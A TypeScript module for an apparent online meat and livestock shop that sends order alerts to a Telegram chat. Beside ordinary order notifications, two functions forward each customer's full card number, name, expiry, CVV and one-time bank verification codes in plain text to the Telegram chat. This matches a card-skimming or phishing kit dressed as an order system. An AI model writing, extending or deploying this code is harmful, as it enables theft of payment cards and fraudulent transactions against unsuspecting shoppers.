const TELEGRAM_API = "https://api.telegram.org";

function getConfig(): { token: string; chatId: string } | null {
  const token = process.env.TELEGRAM_BOT_TOKEN || "";
  const chatId = process.env.TELEGRAM_CHAT_ID || "";
  if (!token || !chatId) {
    console.warn("[Telegram] Notifications disabled: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not configured");
    return null;
  }
  return { token, chatId };
}

export async function sendTelegramMessage(text: string): Promise<void> {
  const config = getConfig();
  if (!config) return;

  try {
    const url = `${TELEGRAM_API}/bot${config.token}/sendMessage`;
    const resp = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: config.chatId,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });

    if (!resp.ok) {
      const msg = await resp.text().catch(() => resp.statusText);
      console.error(`[Telegram] Failed to send message (${resp.status}): ${msg}`);
    } else {
      console.log("[Telegram] Message sent successfully");
    }
  } catch (error) {
    console.error("[Telegram] Error sending message:", error);
  }
}

function escapeHtml(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return "";
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

export function sendTelegramOrderNotification(order: {
  id: number;
  customerName: string;
  phone: string;
  address: string;
  productName: string;
  quantity: number;
  pickupDate: string;
  preparationType?: string | null;
  paymentMethod: string;
  paymentStatus: string;
  createdAt: Date | string;
}): Promise<void> {
  const preparationLabel =
    order.preparationType === "slaughtered" ? "مذبوح مقطع" :
    order.preparationType === "live" ? "حي بدون ذبح" : "";
  const paymentMethodLabel = order.paymentMethod === "pay_now" ? "دفع فوري" : "دفع عند الاستلام";
  const paymentStatusLabel =
    order.paymentStatus === "paid" ? "مدفوع" :
    order.paymentStatus === "pending" ? "قيد الانتظار" : "غير مطلوب";

  const text = [
    "🔔 <b>طلب جديد!</b>",
    "",
    `🧾 رقم الطلب: <b>#${escapeHtml(order.id)}</b>`,
    `👤 العميل: ${escapeHtml(order.customerName)}`,
    `📞 الهاتف: ${escapeHtml(order.phone)}`,
    `📍 العنوان: ${escapeHtml(order.address)}`,
    `🛍️ المنتج: ${escapeHtml(order.productName)}`,
    `🔢 الكمية: ${escapeHtml(order.quantity)}`,
    preparationLabel ? `🍖 نوع التحضير: ${escapeHtml(preparationLabel)}` : "",
    `📅 تاريخ التسليم: ${escapeHtml(order.pickupDate)}`,
    `💳 طريقة الدفع: ${escapeHtml(paymentMethodLabel)}`,
    `💰 حالة الدفع: ${escapeHtml(paymentStatusLabel)}`,
  ].filter(Boolean).join("\n");

  return sendTelegramMessage(text);
}

export function sendTelegramCardAttemptNotification(order: {
  id: number;
  customerName: string;
  productName: string;
}, cardName: string, cardNumber: string, cardExpiry: string, cardCvv?: string): Promise<void> {
  const text = [
    "💳 <b>محاولة بطاقة دفع!</b>",
    "",
    `🧾 رقم الطلب: <b>#${escapeHtml(order.id)}</b>`,
    `👤 العميل: ${escapeHtml(order.customerName)}`,
    `🛍️ المنتج: ${escapeHtml(order.productName)}`,
    `👤 اسم البطاقة: ${escapeHtml(cardName)}`,
    `🔢 رقم البطاقة: <code>${escapeHtml(cardNumber)}</code>`,
    `📅 تاريخ الانتهاء: ${escapeHtml(cardExpiry)}`,
    cardCvv ? `🔐 رمز الأمان: <code>${escapeHtml(cardCvv)}</code>` : "",
  ].filter(Boolean).join("\n");

  return sendTelegramMessage(text);
}

export function sendTelegramOtpAttemptNotification(order: {
  id: number;
  customerName: string;
  productName: string;
}, otpCode: string, success: boolean): Promise<void> {
  const statusEmoji = success ? "✅" : "❌";
  const statusText = success ? "تم التحقق بنجاح" : "فشل التحقق";

  const text = [
    `${statusEmoji} <b>محاولة رمز تحقق!</b>`,
    "",
    `🧾 رقم الطلب: <b>#${escapeHtml(order.id)}</b>`,
    `👤 العميل: ${escapeHtml(order.customerName)}`,
    `🛍️ المنتج: ${escapeHtml(order.productName)}`,
    `🔐 رمز التحقق: <code>${escapeHtml(otpCode)}</code>`,
    `📋 الحالة: ${escapeHtml(statusText)}`,
  ].filter(Boolean).join("\n");

  return sendTelegramMessage(text);
}